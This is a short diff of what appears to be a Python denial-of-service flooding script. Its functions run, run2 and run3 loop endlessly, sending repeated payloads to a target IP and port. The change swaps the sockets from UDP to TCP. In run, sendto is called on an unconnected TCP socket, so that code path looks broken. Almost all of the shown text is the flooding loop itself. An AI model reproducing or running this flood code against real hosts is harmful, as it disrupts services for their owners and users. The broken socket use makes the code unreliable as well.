@@ -36,7 +36,7 @@ def run():
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
@@ -49,7 +49,7 @@ def run2():
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
@@ -64,7 +64,7 @@ def run3():
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
